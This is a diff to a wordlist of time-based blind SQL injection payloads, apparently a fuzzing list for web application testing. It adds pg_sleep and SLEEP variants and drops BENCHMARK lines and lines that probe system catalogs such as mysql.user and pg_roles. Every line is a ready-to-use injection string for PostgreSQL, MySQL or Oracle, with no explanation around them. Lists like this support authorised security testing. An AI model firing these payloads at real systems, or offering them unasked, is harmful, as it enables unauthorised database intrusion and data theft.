@@ -9,9 +9,11 @@
 ' OR (SELECT pg_sleep(10)) IS NULL--
 ' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(10) END) IS NULL--
 ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NOT NULL--
+' || CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 '||pg_sleep(10)::text--
 '||(pg_sleep(10))--
 '||(SELECT pg_sleep(10))--
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) END)--
 '' || pg_sleep(10)--
 0 || pg_sleep(10)--
 ') || pg_sleep(10)--
@@ -25,6 +27,10 @@
 1 OR (SELECT pg_sleep(10))
 ' AND (SELECT 1 WHERE pg_sleep(10))--
 ' AND (SELECT pg_sleep(10))--
+' AND ((SELECT pg_sleep(10)))--
+' AND (SELECT (SELECT pg_sleep(10)))--
+' OR (SELECT (pg_sleep(10)))--
+' OR ((SELECT pg_sleep(10)))--
 ' OR (SELECT pg_sleep(5+5))--
 ' AND (SELECT pg_sleep(5+5))--
 ' OR (SELECT pg_sleep(2*5))--
@@ -37,7 +43,13 @@
 ' AND (SELECT CASE WHEN 'a'='a' THEN pg_sleep(10) END)--
 ' OR pg_sleep(10)--
 ' AND pg_sleep(10)--
+' OR pg_sleep(5+5)--
+' AND pg_sleep(5+5)--
+' OR pg_sleep(2*5)--
+' AND pg_sleep(2*5)--
 '||pg_sleep(10)--
+'||pg_sleep(5+5)--
+'||pg_sleep(2*5)--
 ' OR SLEEP(10)--
 ' AND SLEEP(10)--
 ' OR SLEEP(5+5)--
@@ -52,6 +64,10 @@
 ' OR IF('a'='a',SLEEP(10),0)--
 ' AND (SELECT SLEEP(10))--
 ' OR (SELECT SLEEP(10))--
+' AND (SELECT SLEEP(5+5))--
+' OR (SELECT SLEEP(5+5))--
+' AND (SELECT SLEEP(2*5))--
+' OR (SELECT SLEEP(2*5))--
 ' AND EXISTS(SELECT SLEEP(10))--
 ' OR EXISTS(SELECT SLEEP(10))--
 ' AND (SELECT IF(1=1,SLEEP(10),NULL))--
@@ -114,36 +130,6 @@ test%') OR SLEEP(10)--
 0 || DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
 ' AND (SELECT 1 FROM dual WHERE 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)=1) IS NOT NULL--
 " || DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--
-' OR (SELECT BENCHMARK(10000000,MD5(1)))--
-' AND (SELECT BENCHMARK(10000000,MD5(1)))--
-' OR (SELECT BENCHMARK(5000000,MD5(1)))--
-' AND (SELECT BENCHMARK(5000000,MD5(1)))--
-' OR (SELECT BENCHMARK(1000000,MD5(1)))--
-' AND (SELECT BENCHMARK(1000000,MD5(1)))--
-' OR (SELECT pg_sleep(10) FROM generate_series(1,1))--
-' AND (SELECT pg_sleep(10) FROM generate_series(1,1))--
-' OR (SELECT pg_sleep(10) FROM generate_series(1,2))--
-' AND (SELECT pg_sleep(10) FROM generate_series(1,2))--
-' OR (SELECT pg_sleep(10) FROM generate_series(1,5))--
-' AND (SELECT pg_sleep(10) FROM generate_series(1,5))--
-' OR (SELECT SLEEP(10) FROM information_schema.tables LIMIT 1 OFFSET 0)--
-' AND (SELECT SLEEP(10) FROM information_schema.tables LIMIT 1 OFFSET 0)--
-' OR (SELECT SLEEP(10) FROM information_schema.tables LIMIT 1 OFFSET 1)--
-' AND (SELECT SLEEP(10) FROM information_schema.tables LIMIT 1 OFFSET 1)--
-' OR (SELECT SLEEP(10) FROM information_schema.columns LIMIT 1 OFFSET 2)--
-' AND (SELECT SLEEP(10) FROM information_schema.columns LIMIT 1 OFFSET 2)--
-' OR (SELECT pg_sleep(10) FROM pg_catalog.pg_class LIMIT 1)--
-' AND (SELECT pg_sleep(10) FROM pg_catalog.pg_class LIMIT 1)--
-' OR (SELECT pg_sleep(10) FROM pg_catalog.pg_class LIMIT 1 OFFSET 1)--
-' AND (SELECT pg_sleep(10) FROM pg_catalog.pg_class LIMIT 1 OFFSET 1)--
-' OR (SELECT pg_sleep(10) FROM pg_roles LIMIT 1)--
-' AND (SELECT pg_sleep(10) FROM pg_roles LIMIT 1)--
-' OR (SELECT pg_sleep(10) FROM pg_roles LIMIT 1 OFFSET 1)--
-' AND (SELECT pg_sleep(10) FROM pg_roles LIMIT 1 OFFSET 1)--
-' OR (SELECT SLEEP(10) FROM mysql.user LIMIT 1)--
-' AND (SELECT SLEEP(10) FROM mysql.user LIMIT 1)--
-' OR (SELECT SLEEP(10) FROM mysql.user LIMIT 1 OFFSET 1)--
-' AND (SELECT SLEEP(10) FROM mysql.user LIMIT 1 OFFSET 1)--
 ' OR IF(EXISTS(SELECT 1),SLEEP(10),0)--
 ' AND IF(EXISTS(SELECT 1),SLEEP(10),0)--
 ' OR (SELECT CASE WHEN EXISTS(SELECT 1) THEN SLEEP(10) END)--
